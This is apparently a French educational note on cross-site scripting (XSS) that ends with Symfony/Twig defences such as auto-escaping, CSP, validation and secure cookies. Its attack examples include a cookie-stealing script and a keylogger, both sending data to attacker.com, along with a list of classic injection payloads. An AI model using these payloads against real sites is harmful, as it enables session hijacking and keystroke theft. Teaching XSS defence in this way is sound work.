# FAILLE XSS (Cross-Site Scripting)

## INTRODUCTION

La faille XSS (Cross-Site Scripting), ou injection de script intersite, est une vulnérabilité web 
qui permet à un attaquant d'injecter du code JavaScript malveillant dans une page utilisée par 
d'autres utilisateurs.

L'objectif est de faire exécuter un script dans le navigateur de la victime, comme s'il provenait 
du site légitime.

Ce script peut ensuite voler des informations sensibles (comme les cookies de session), rediriger 
l'utilisateur, ou modifier l'apparence du site.

---

## FONCTIONNEMENT

(Étape optionnelle) L'attaquant envoie un lien vers le site web ciblé

1. La victime se connecte au site web ciblé

2. L'attaquant y insère du code JavaScript malveillant, en passant par exemple par l'URL si la 
   victime a cliqué sur le lien, ou en affichant du code en clair depuis un commentaire sur la page.

3. Si le site ne filtre pas correctement les entrées, ce texte ou cet URL est considéré comme du 
   code légitime et est enregistré ou renvoyé dans la page web.

4. À partir de là il est possible à l'attaquant de :
   • Récupérer les cookies ou tokens de session,
   • Afficher de faux formulaires de connexion,
   • Rediriger vers des sites malveillants,
   • Ou injecter d'autres scripts dans le site.

---

## TYPES DE XSS

### 1. XSS RÉFLÉCHI (Reflected XSS)
- Le script malveillant est inclus dans l'URL ou une requête
- Nécessite que la victime clique sur un lien piégé
- Non persistant (une seule exécution)

**Exemple :** `https://example.com/search?q=<script>alert('XSS')</script>`

### 2. XSS STOCKÉ (Stored XSS)
- Le script est enregistré dans la base de données
- S'exécute à chaque affichage de la page
- Plus dangereux car affecte tous les utilisateurs

**Exemple :** Commentaire contenant du code JavaScript malveillant

### 3. XSS DOM-BASED
- Exploitation côté client uniquement
- Manipulation du DOM par JavaScript
- Le serveur n'est pas impliqué

---

## MOYENS D'INJECTION FRÉQUENTS

• Champs de formulaire (commentaires, profils, messageries, etc.)  
• Paramètres d'URL visibles  
• Téléversement de fichiers (SVG, HTML) contenant du JS  
• Widgets ou scripts tiers compromis (ex : Google Analytics)

Dans tous les cas, le navigateur exécutera le code dès qu'il le considère comme faisant partie 
du site légitime.

---

## EXEMPLES D'ATTAQUES

### 1. Vol de cookies de session :
```javascript
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### 2. Redirection malveillante :
```javascript
<script>window.location='https://phishing-site.com';</script>
```

### 3. Keylogger :
```javascript
<script>
  document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>
```

### 4. Défacement de page :
```javascript
<script>document.body.innerHTML='Site Hacked!';</script>
```

### 5. Injection dans attribut :
```html
<input value="recherche" onmouseover="alert('XSS')">
```

---

## VECTEURS D'INJECTION

- Balises script : `<script>code</script>`
- Gestionnaires d'événements : `<img src=x onerror="alert('XSS')">`
- Attributs HTML : `<a href="javascript:alert('XSS')">`
- Styles CSS : `<style>@import'http://attacker.com/malicious.css';</style>`
- Iframes : `<iframe src="javascript:alert('XSS')">`
- SVG : `<svg onload="alert('XSS')">`

---

## PAYLOADS CLASSIQUES

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<div onmouseover="alert('XSS')">
```

---

## CONSÉQUENCES POSSIBLES

• Vol de cookies ou de tokens d'authentification  
• Usurpation de session ou d'identité  
• Altération de l'affichage du site (ex. faux formulaires de connexion, modification visuelle du site)  
  - Dans certains cas, il est possible d'une propagation automatique du code XSS à d'autres pages 
    du site, surtout en cas d'utilisation de widgets tiers compromis  
• Vol de données sensibles  
• Phishing ciblé  
• Propagation de malwares  
• Actions non autorisées au nom de l'utilisateur  
• Installation de keyloggers

---

## PROTECTION

Plusieurs techniques permettent d'éviter les failles XSS :

• **Échappement systématique des caractères HTML spéciaux :**
  - Convertir <, >, ", ', & en entités HTML (&lt;, &gt;, etc.)

• **Validation et nettoyage des entrées utilisateurs :**
  - Refuser ou filtrer les caractères interdits, les balises `<script>`, les événements 
    (onload, onclick), etc.

• **Utilisation d'un moteur de template sécurisé :**
  - Qui échappe automatiquement les variables insérées dans le HTML, comme Twig dans Symfony

• **Content Security Policy (CSP) :**
  - Définir les sources autorisées pour les scripts

• **Cookies sécurisés :**
  - Utiliser les flags HTTPOnly, Secure, SameSite

---

## CAS SYMFONY

Symfony intègre une protection native contre les XSS à travers son moteur de templates Twig.

Par défaut, Twig échappe automatiquement toutes les variables affichées dans une page HTML.

Pour insérer volontairement du contenu HTML sûr, le développeur doit utiliser le filtre `|raw`.
• Cette opération est manuelle et consciente, afin d'éviter les erreurs involontaires.

Les formulaires Symfony filtrent et valident également les entrées via le composant Validator, 
empêchant l'injection directe de contenu non conforme ou dangereux.

---

## EXEMPLES SYMFONY / TWIG

```twig
{# Twig échappe automatiquement par défaut #}
<p>{{ user.name }}</p>  {# SÉCURISÉ #}

{# Pour du HTML intentionnel (ATTENTION) #}
<div>{{ content|raw }}</div>  {# DANGEREUX si content non validé #}

{# Échappement JavaScript #}
<script>
    var username = {{ user.name|json_encode|raw }};
</script>

{# Échappement d'attribut #}
<div data-user="{{ user.name|e('html_attr') }}">
```

```php
// Dans un contrôleur Symfony
use Symfony\Component\HttpFoundation\Response;

public function display(string $userInput): Response
{
    // htmlspecialchars est appliqué automatiquement par Twig
    return $this->render('page.html.twig', [
        'data' => $userInput  // Sera échappé automatiquement
    ]);
}
```

---

## CONTENT SECURITY POLICY (CSP)

```
// Configuration dans Symfony (config/packages/security.yaml ou middleware)

Content-Security-Policy: 
    default-src 'self'; 
    script-src 'self' 'nonce-{random}'; 
    style-src 'self' 'unsafe-inline'; 
    img-src 'self' data: https:;
    object-src 'none';
```

Ou via bundle :
```bash
composer require nelmio/security-bundle
```

```yaml
# config/packages/nelmio_security.yaml
nelmio_security:
    csp:
        enabled: true
        report_uri: /csp-report
        default-src: ['self']
        script-src: ['self', 'unsafe-inline']
```

---

## VALIDATION DES ENTRÉES

```php
use Symfony\Component\Validator\Constraints as Assert;

class CommentDTO
{
    #[Assert\NotBlank]
    #[Assert\Length(max: 500)]
    #[Assert\Regex(
        pattern: '/^[a-zA-Z0-9\s\.,!?-]+$/',
        message: 'Caractères non autorisés détectés'
    )]
    private string $content;
}
```

---

## COOKIES SÉCURISÉS

```yaml
# config/packages/framework.yaml
framework:
    session:
        cookie_secure: true
        cookie_httponly: true
        cookie_samesite: 'lax'
```

---

## DÉTECTION ET TEST

- OWASP ZAP
- Burp Suite
- XSS Hunter
- Tests manuels avec payloads
- BeEF (Browser Exploitation Framework)

---

## EXEMPLE COMPLET SÉCURISÉ

```php
// Controller
#[Route('/comment/add', methods: ['POST'])]
public function add(Request $request, EntityManagerInterface $em): Response
{
    $comment = new Comment();
    $form = $this->createForm(CommentType::class, $comment);
    $form->handleRequest($request);
    
    if ($form->isSubmitted() && $form->isValid()) {
        // Les données sont validées et seront échappées par Twig
        $em->persist($comment);
        $em->flush();
        
        return $this->redirectToRoute('comments_list');
    }
    
    return $this->render('comment/add.html.twig', ['form' => $form]);
}
```

```twig
// Template Twig
{# Échappement automatique #}
<div class="comment">
    <p>{{ comment.content }}</p>
    <span>Par {{ comment.author.username }}</span>
</div>
```

---

## CONCLUSION

La faille XSS repose sur la mauvaise gestion du contenu utilisateur et permet d'exécuter du 
JavaScript malveillant dans le navigateur d'autrui.

Dans notre cas, grâce à Twig et à ses mécanismes d'échappement automatique, Symfony neutralise 
efficacement la plupart des tentatives XSS, tant que le développeur ne désactive pas volontairement 
cette protection.

---

**NIVEAU DE RISQUE : ÉLEVÉ À CRITIQUE**  
**FACILITÉ D'EXPLOITATION : FACILE**  
**TOP OWASP : #7**
